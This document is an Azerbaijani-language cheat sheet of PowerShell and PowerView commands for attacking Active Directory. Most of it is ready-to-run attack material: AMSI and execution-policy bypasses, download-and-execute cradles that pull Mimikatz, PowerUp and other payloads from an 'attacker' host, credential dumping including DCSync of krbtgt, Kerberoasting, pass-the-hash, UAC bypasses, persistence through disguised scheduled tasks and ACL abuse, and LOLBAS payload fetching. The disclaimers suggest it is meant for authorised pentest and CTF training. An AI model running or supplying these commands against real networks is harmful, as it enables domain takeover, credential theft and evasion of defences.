# 🛡️ Active Directory Pentest — PowerShell & PowerView Cheat Sheet

> **Məqsəd:** Bu cheat sheet yalnız **icazəli** pentest və CTF mühitlərində istifadə üçündür.  
> Qeyri-qanuni istifadə cinayət məsuliyyətinə səbəb ola bilər.

---

## 📌 MÜNDƏRİCAT

1. [Ümumi PowerShell Komandaları](#1-ümumi-powershell-komandaları)
2. [Execution Policy & Bypass](#2-execution-policy--bypass)
3. [Sistem & Şəbəkə Kəşfiyyatı](#3-sistem--şəbəkə-kəşfiyyatı)
4. [AD Enumeration (Native)](#4-ad-enumeration-native)
5. [PowerView — Quraşdırma](#5-powerview--quraşdırma)
6. [PowerView — Domain Enumeration](#6-powerview--domain-enumeration)
7. [PowerView — User & Group Enumeration](#7-powerview--user--group-enumeration)
8. [PowerView — Computer Enumeration](#8-powerview--computer-enumeration)
9. [PowerView — ACL & Permission Analizi](#9-powerview--acl--permission-analizi)
10. [PowerView — Trust & Forest Enumeration](#10-powerview--trust--forest-enumeration)
11. [PowerView — GPO Enumeration](#11-powerview--gpo-enumeration)
12. [Credential Harvesting](#12-credential-harvesting)
13. [Lateral Movement](#13-lateral-movement)
14. [Privilege Escalation](#14-privilege-escalation)
15. [Persistence](#15-persistence)
16. [LOLBAS & AV Bypass](#16-lolbas--av-bypass)

---

## 1. Ümumi PowerShell Komandaları

```powershell
# PowerShell versiyasını yoxla
$PSVersionTable.PSVersion

# Cari istifadəçi
whoami
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Admin olub-olmadığını yoxla
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Environment dəyişənləri
Get-ChildItem Env:
$env:USERNAME
$env:USERDOMAIN
$env:COMPUTERNAME

# Cari qovluq
Get-Location
(Get-Item .).FullName
```

---

## 2. Execution Policy & Bypass

```powershell
# Execution policy yoxla
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# Bypass metodları
Set-ExecutionPolicy Bypass -Scope Process -Force
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass

# Encoded command ilə bypass
$cmd = "IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded

# AMSI Bypass (test mühitində)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# In-memory script yüklə
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
iwr -UseBasicParsing http://attacker/script.ps1 | iex
```

---

## 3. Sistem & Şəbəkə Kəşfiyyatı

```powershell
# Sistem məlumatları
systeminfo
Get-ComputerInfo
Get-WmiObject -Class Win32_OperatingSystem

# Şəbəkə konfiqurasiyası
ipconfig /all
Get-NetIPConfiguration
Get-NetIPAddress

# ARP cədvəli
arp -a
Get-NetNeighbor

# Route cədvəli
route print
Get-NetRoute

# DNS
nslookup domain.local
Resolve-DnsName domain.local

# Açıq portlar
netstat -ano
Get-NetTCPConnection -State Listen

# Firewall qaydaları
Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True'}
netsh advfirewall show allprofiles

# İşləyən proseslər
Get-Process
Get-WmiObject Win32_Process | Select Name, ProcessId, CommandLine

# Servisler
Get-Service | Where-Object {$_.Status -eq 'Running'}
Get-WmiObject Win32_Service | Select Name, StartName, State

# Scheduled Tasks
Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'}
schtasks /query /fo LIST /v

# Local istifadəçilər
Get-LocalUser
net user

# Local qruplar
Get-LocalGroup
net localgroup

# Administrators qrupu
Get-LocalGroupMember -Group "Administrators"
net localgroup administrators

# Paylaşılan qovluqlar
Get-SmbShare
net share

# Quraşdırılmış proqramlar
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion
Get-WmiObject -Class Win32_Product | Select Name, Version
```

---

## 4. AD Enumeration (Native)

```powershell
# Domain məlumatları
$env:USERDNSDOMAIN
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# LDAP sorğusu üçün ADSI istifadəsi
$domain = New-Object System.DirectoryServices.DirectoryEntry
$searcher = New-Object System.DirectoryServices.DirectorySearcher($domain)

# Bütün istifadəçilər
$searcher.Filter = "(&(objectCategory=person)(objectClass=user))"
$searcher.FindAll()

# Domain Controller tapma
nltest /dclist:domain.local
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers

# Domain admins
net group "Domain Admins" /domain

# Enterprise admins
net group "Enterprise Admins" /domain

# Password Policy
net accounts /domain

# Domain Trust
nltest /domain_trusts

# Kerberos biletlərini siyahıla
klist

# SPN-ləri siyahıla (Kerberoasting üçün)
setspn -T domain.local -Q */*
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

---

## 5. PowerView — Quraşdırma

```powershell
# GitHub-dan yüklə (şəbəkə icazəsi varsa)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# Lokal fayldan yüklə
Import-Module .\PowerView.ps1
. .\PowerView.ps1

# Yükləndiyini yoxla
Get-Command -Module PowerView
Get-Command Get-Domain
```

---

## 6. PowerView — Domain Enumeration

```powershell
# Domain məlumatları
Get-Domain
Get-Domain -Domain domain.local

# Domain Controller-lər
Get-DomainController
Get-DomainController -Domain domain.local

# Domain Policy
Get-DomainPolicy
(Get-DomainPolicy)."system access"
(Get-DomainPolicy)."kerberos policy"

# Domain SID
Get-DomainSID

# Forest məlumatları
Get-Forest
Get-ForestDomain
Get-ForestCatalog
Get-ForestDomainController
```

---

## 7. PowerView — User & Group Enumeration

```powershell
# Bütün istifadəçilər
Get-DomainUser
Get-DomainUser -Identity johndoe
Get-DomainUser | Select SamAccountName, Description, LastLogonDate

# Admin istifadəçilər
Get-DomainUser -AdminCount 1

# Şifrəsi sürülməyən istifadəçilər (AS-REP Roasting)
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQUIRE_PREAUTH

# Kerberoastable istifadəçilər (SPN olan)
Get-DomainUser -SPN
Get-DomainUser -SPN | Select SamAccountName, ServicePrincipalName

# Aktiv olmayan hesablar
Get-DomainUser -LDAPFilter "(!lastlogon=*)"

# Şifrə dəyişməyən hesablar
Get-DomainUser -UACFilter PASSWORD_NEVER_EXPIRES

# Description-da şifrə axtarışı
Get-DomainUser | Where-Object {$_.description -ne $null} | Select SamAccountName, Description

# Bütün qruplar
Get-DomainGroup
Get-DomainGroup -Identity "Domain Admins"

# Qrup üzvləri
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# İstifadəçinin üzv olduğu qruplar
Get-DomainGroup -UserName "johndoe"

# Local qruplar (uzaq maşında)
Get-NetLocalGroup -ComputerName DC01
Get-NetLocalGroupMember -ComputerName DC01 -GroupName "Administrators"
```

---

## 8. PowerView — Computer Enumeration

```powershell
# Bütün kompüterlər
Get-DomainComputer
Get-DomainComputer | Select Name, OperatingSystem, LastLogonDate

# Domain Controller-lər
Get-DomainComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=8192)"

# Aktiv maşınlar (ping)
Get-DomainComputer -Ping

# OS-ə görə filter
Get-DomainComputer -OperatingSystem "*Server 2019*"
Get-DomainComputer -OperatingSystem "*Windows 10*"

# Session məlumatları (kim harada login olub)
Get-NetSession -ComputerName DC01
Get-NetLoggedon -ComputerName DC01

# Bütün maşınlarda aktiv sessiyalar
Get-DomainComputer | Get-NetSession
Get-DomainComputer -Ping | Invoke-StealthUserHunter

# İstifadəçini şəbəkədə tap
Find-DomainUserLocation -UserName "Administrator"
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# Paylaşılan qovluqlar
Find-DomainShare
Find-DomainShare -CheckShareAccess
Find-InterestingDomainShareFile -Include "*.txt","*.xml","*.config","*.ini"

# Qiymətli fayllar
Find-InterestingDomainShareFile -Include "*password*","*credential*","*secret*"
```

---

## 9. PowerView — ACL & Permission Analizi

```powershell
# Obyektin ACL-lərini gör
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
Get-DomainObjectAcl -Identity "DC01" -ResolveGUIDs

# Cari istifadəçinin sahib olduğu ACL-lər
Get-DomainObjectAcl -Identity * | Where-Object {$_.IdentityReference -match "johndoe"}

# Maraqlı ACL-lər (WriteDACL, GenericAll, etc.)
Find-InterestingDomainAcl -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "johndoe"}

# GenericAll hüquqlarını tap
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll" -and
    $_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM"
}

# DCSync icazəsi olan hesablar
Get-DomainObjectAcl -Identity "DC=domain,DC=local" -ResolveGUIDs | Where-Object {
    $_.ObjectAceType -match "Replication-Get-Changes"
}

# Path-based ACL analizi
Get-PathAcl -Path "\\DC01\SYSVOL"

# AdminSDHolder
Get-DomainObjectAcl -Identity "AdminSDHolder" -ResolveGUIDs
```

---

## 10. PowerView — Trust & Forest Enumeration

```powershell
# Domain Trust-lar
Get-DomainTrust
Get-DomainTrust -Domain domain.local

# Forest Trust-lar
Get-ForestTrust
Get-ForestTrust -Forest external.local

# Bütün domain-lər (forest daxilində)
Get-ForestDomain

# Trust Map
Get-DomainTrustMapping

# Foreign group membership (cross-domain)
Get-DomainForeignGroupMember
Get-DomainForeignUser
```

---

## 11. PowerView — GPO Enumeration

```powershell
# Bütün GPO-lar
Get-DomainGPO
Get-DomainGPO | Select DisplayName, WhenCreated, WhenChanged

# Maşına tətbiq edilən GPO-lar
Get-DomainGPO -ComputerIdentity DC01

# İstifadəçiyə tətbiq edilən GPO-lar
Get-DomainGPO -UserIdentity johndoe

# Restricted Groups (local admin vermə)
Get-DomainGPOLocalGroup
Get-DomainGPOLocalGroup | Select GPODisplayName, GroupName, GroupMembers

# İstifadəçinin local admin olduğu maşınlar
Get-DomainGPOUserLocalGroupMapping -UserIdentity johndoe

# Maşında local admin olanlar
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity DC01

# OU siyahısı
Get-DomainOU
Get-DomainOU | Select Name, DistinguishedName
```

---

## 12. Credential Harvesting

```powershell
# Mimikatz (PowerShell versiyası — Invoke-Mimikatz)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
Invoke-Mimikatz -Command '"lsadump::sam"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'

# SAM dump
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive

# LSA Secrets
reg query HKLM\SECURITY\Policy\Secrets

# Credential Manager
cmdkey /list
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]::new().RetrieveAll() | % { $_.RetrievePassword(); $_ }

# WiFi şifrələri
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# Kerberoasting
Invoke-Kerberoast -OutputFormat Hashcat
Invoke-Kerberoast | fl

# AS-REP Roasting
Get-ASREPHash -UserName johndoe -Domain domain.local
Invoke-ASREPRoast -OutputFormat Hashcat

# PowerView ilə Kerberoasting
Request-SPNTicket -SPN "MSSQLSvc/DC01.domain.local:1433" -Format Hashcat

# DPAPI credential-ları
Get-DomainUser | Get-DomainSPNTicket -OutputFormat Hashcat
```

---

## 13. Lateral Movement

```powershell
# PSSession (WinRM)
$sess = New-PSSession -ComputerName DC01
Enter-PSSession -ComputerName DC01
Invoke-Command -ComputerName DC01 -ScriptBlock {whoami}
Invoke-Command -Session $sess -ScriptBlock {ipconfig}

# Credential ilə PSSession
$cred = Get-Credential
New-PSSession -ComputerName DC01 -Credential $cred

# WMI ilə uzaq icra
Invoke-WmiMethod -ComputerName DC01 -Class Win32_Process -Name Create -ArgumentList "calc.exe"
wmic /node:DC01 process call create "powershell.exe -ep bypass -c IEX(...)"

# PsExec (Sysinternals)
.\PsExec.exe \\DC01 -u domain\admin -p Password123 cmd.exe

# SMB ilə fayl kopyalama
Copy-Item -Path .\payload.exe -Destination "\\DC01\C$\Windows\Temp\"

# Pass-the-Hash (Invoke-WMIExec)
Invoke-WMIExec -Target DC01 -Username Administrator -Hash "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c" -Command "whoami"

# Token Impersonation (Invoke-TokenManipulation)
Invoke-TokenManipulation -ImpersonateUser -Username "domain\admin"
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "domain\admin"

# OverPass-the-Hash
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:HASH /run:powershell.exe
```

---

## 14. Privilege Escalation

```powershell
# PowerUp (Misconfigurasiya axtarışı)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerUp.ps1')
Invoke-AllChecks

# Unquoted Service Paths
Get-ServiceUnquoted
Get-WmiObject Win32_Service | Where-Object {$_.PathName -match ' ' -and $_.PathName -notmatch '"'}

# Yazıla bilən servis yolları
Get-ModifiableServiceFile
Get-ModifiablePath

# Zəif servis icazələri
Get-ModifiableService
Invoke-ServiceAbuse -Name "VulnerableService"

# AlwaysInstallElevated
Get-RegistryAlwaysInstallElevated
Invoke-AllChecks | Where-Object {$_.Check -match "AlwaysInstallElevated"}

# Token Privileges
whoami /priv
# SeImpersonatePrivilege → JuicyPotato / PrintSpoofer
# SeBackupPrivilege → SAM dump
# SeDebugPrivilege → Mimikatz

# UAC Bypass
Invoke-EventViewer
Invoke-FodHelperBypass
Invoke-EnvBypass

# DLL Hijacking
Find-PathDLLHijack
Find-ProcessDLLHijack
```

---

## 15. Persistence

```powershell
# Registry Run Key
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\Windows\Temp\payload.exe"

# Scheduled Task
$action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\payload.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -RunLevel Highest

# WMI Event Subscription
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "PersistFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Golden Ticket (Mimikatz)
# Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /id:500 /ptt"'

# Silver Ticket
# Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:domain.local /sid:S-1-5-21-... /target:DC01 /service:cifs /rc4:HASH /ptt"'

# Skeleton Key (Domain Controller-ə)
# Invoke-Mimikatz -Command '"misc::skeleton"' -ComputerName DC01.domain.local

# AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity "AdminSDHolder" -PrincipalIdentity johndoe -Rights All

# DCSync icazəsi ver
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity johndoe -Rights DCSync
```

---

## 16. LOLBAS & AV Bypass

```powershell
# certutil ilə fayl yüklə
certutil -urlcache -split -f http://attacker/payload.exe C:\Windows\Temp\payload.exe

# bitsadmin ilə yüklə
bitsadmin /transfer job /download /priority high http://attacker/payload.exe C:\Temp\payload.exe

# mshta ilə icra
mshta http://attacker/payload.hta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass"":close")

# regsvr32 (AppLocker bypass)
regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll

# rundll32
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";eval("w=new%20ActiveXObject(""WScript.Shell"");w.run(""powershell"")");

# wmic
wmic process call create "powershell -ep bypass -w hidden -c IEX(...)"

# InstallUtil
InstallUtil.exe /logfile= /logtoconsole=false /U payload.exe

# Encoded + compressed payload
$ms = New-Object IO.MemoryStream(,[Convert]::FromBase64String($b64))
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()

# String concatenation (Signature bypass)
$c = 'Inv'+'oke-Exp'+'ression'
& $c "whoami"

# Out-of-scope şifrəli kanal
# IEX ilə HTTPS üzərindən: ServicePointManager bypass
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
IEX (New-Object Net.WebClient).DownloadString('https://attacker/script.ps1')
```

---

## 🔗 Faydalı Alətlər & Resurslar

| Alət | İstifadə | Link |
|------|----------|------|
| **PowerView** | AD Enumeration | PowerSploit/Recon |
| **PowerUp** | Priv Esc | PowerSploit/Privesc |
| **Mimikatz** | Credential Dump | gentilkiwi/mimikatz |
| **BloodHound** | AD Attack Path | BloodHoundAD |
| **SharpHound** | BloodHound collector | BloodHoundAD |
| **Rubeus** | Kerberos attacks | GhostPack |
| **CrackMapExec** | Network sweep | byt3bl33d3r |
| **Impacket** | Protocol attacks | SecureAuthCorp |
| **Covenant** | C2 Framework | cobbr/Covenant |

---

## ⚡ Sürətli Referans

```
AD Pentest Axışı:
1. Enumeration  → Get-Domain, Get-DomainUser, Get-DomainComputer
2. Credentialler → Kerberoast, AS-REP Roast, Password Spray
3. Lateral Move → PSSession, WMI, Pass-the-Hash
4. Priv Esc     → PowerUp, Token Abuse, GPO abuse
5. DA Elde Et   → DCSync, Golden Ticket
6. Persistence  → Skeleton Key, AdminSDHolder, Registry
```

---

> ⚠️ **Xəbərdarlıq:** Bu alətlər yalnız **icazəli pentest**, **CTF**, və **lab mühitlərində** istifadə edilməlidir.  
> Qeyri-icazəli şəbəkələrdə istifadə qanunazidd hesab olunur.
